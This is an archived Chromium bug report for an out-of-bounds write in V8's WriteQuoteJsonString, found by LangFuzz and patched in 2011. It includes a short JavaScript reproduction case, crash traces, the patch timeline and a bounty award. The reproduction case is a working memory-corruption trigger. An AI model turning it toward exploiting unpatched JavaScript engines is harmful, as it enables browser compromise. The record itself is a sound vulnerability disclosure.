# [LangFuzz] Crash at v8::internal::WriteQuoteJsonString with invalid write

| Field | Value |
|-------|-------|
| **Issue ID** | [40050944](https://issues.chromium.org/issues/40050944) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>JavaScript |
| **Reporter** | de...@googlemail.com |
| **Assignee** | ya...@chromium.org |
| **Created** | 2011-11-07 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The JavaScript code below crashes Chromium 17.0.928.0 and d8 shell at function "v8::internal::WriteQuoteJsonString" with an invalid write.

**VERSION**  

Chrome Version: 17.0.928.0 dev  

Operating System: Ubuntu 11.04, tested on 64 bit

**REPRODUCTION CASE**  

var a = [];  

a[1999] = 'e';  

JSON.stringify(a.join(("\u0094" )));

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

GDB trace (no symbols for some reason, it's Chrome from Google directly):

Program received signal SIGSEGV, Segmentation fault.  

0x00007ffff57968dc in ?? ()  

(gdb) bt  

#0 0x00007ffff57968dc in ?? ()  

#1 0x00000e73665ae14e in ?? ()  

#2 0x0000000600000000 in ?? ()  

(gdb) x /4i $pc  

=> 0x7ffff57968dc: movzbl (%rdx,%rdi,1),%edi  

0x7ffff57968e0: lea (%r10,%rsi,1),%rsi  

0x7ffff57968e4: movzbl (%rsi),%r8d  

0x7ffff57968e8: cmp $0x1,%edi  

(gdb) info register rdx rdi edi  

rdx 0x7ffff77dc400 140737345602560  

rdi 0xffffff94 4294967188  

edi 0xffffff94 -108

Valgrind on D8:

==23278== Invalid write of size 1  

==23278== at 0x824909F: \_ZN2v88internalL20WriteQuoteJsonStringIccEEPT\_PNS0\_7IsolateES3\_NS0\_6VectorIKT0\_EE.clone.199 (in /scratch/holler/LangFuzz/v8-3.6/d8)  

==23278== Address 0x5b080022 is not stack'd, malloc'd or (recently) free'd  

==23278==  

==23278==  

==23278== Process terminating with default action of signal 11 (SIGSEGV)  

==23278== Bad permissions for mapped region at address 0x5B080022  

==23278== at 0x824909F: \_ZN2v88internalL20WriteQuoteJsonStringIccEEPT\_PNS0\_7IsolateES3\_NS0\_6VectorIKT0\_EE.clone.199 (in /scratch/holler/LangFuzz/v8-3.6/d8)

## Timeline

### sc...@gmail.com (2011-11-07)

Nice catch.
Hmm, looks nasty. Possible type confusion? I'll let the v8 guys chime in :)

Unfortunately, it affects M15 stable / M16 beta. We'll target a fix for M16 as the last M15 ship has likely sailed.

### sc...@gmail.com (2011-11-07)

[Empty comment from Monorail migration]

### da...@chromium.org (2011-11-08)

[Empty comment from Monorail migration]

### ya...@chromium.org (2011-11-08)

Fixed on bleeding edge r9917, back porting to branches 3.5 and 3.6...

### ya...@chromium.org (2011-11-08)

Branches 3.5 and 3.6 have been patched as of 3.5.10.24 (r9018) and 3.6.6.7 (r9020).

### js...@chromium.org (2011-11-08)

Thanks for the quick turnaround.

### sc...@gmail.com (2011-11-08)

[Empty comment from Monorail migration]

### ka...@google.com (2011-11-16)

adding pavan for test.

### sc...@gmail.com (2011-11-16)

@decoder.oh: thanks for another nice bug. We have an unexpected release going out later today, and it will contain this fix. Not a bad turnaround time :)

Obviously, this is good for a $1000 Chromium Security Reward on account of being an OOB write with a very nicely reduced test case.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-11-16)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-11-23)

Payment in system.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### la...@google.com (2013-01-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/103259?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink, Blink>JavaScript]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050944)*
